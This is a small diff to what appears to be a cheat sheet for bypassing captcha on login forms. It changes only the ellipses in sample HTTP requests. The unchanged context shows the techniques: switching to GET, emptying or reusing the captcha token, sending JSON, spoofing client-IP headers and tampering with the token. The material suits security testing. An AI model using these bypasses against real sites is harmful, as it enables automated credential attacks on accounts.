@@ -4,7 +4,7 @@
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
 ```
@@ -13,14 +13,14 @@ Change the method to GET
 ```
 GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
 Host: target.com
-[...]
+...
 ```
 
 2. Try remove the value of the captcha parameter
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 _RequestVerificationToken=&_Username=daffa&_Password=test123
 ```
@@ -29,7 +29,7 @@ _RequestVerificationToken=&_Username=daffa&_Password=test123
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 _RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
 ```
@@ -38,7 +38,7 @@ _RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 {"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
 ```
@@ -46,7 +46,7 @@ Convert to normal request
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
 ```
@@ -63,7 +63,7 @@ X-Remote-Addr: 127.0.0.1
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
 ```
@@ -71,7 +71,7 @@ Try this to bypass
 ```
 POST / HTTP 1.1
 Host: target.com
-[...]
+...
 
 _RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
 ```
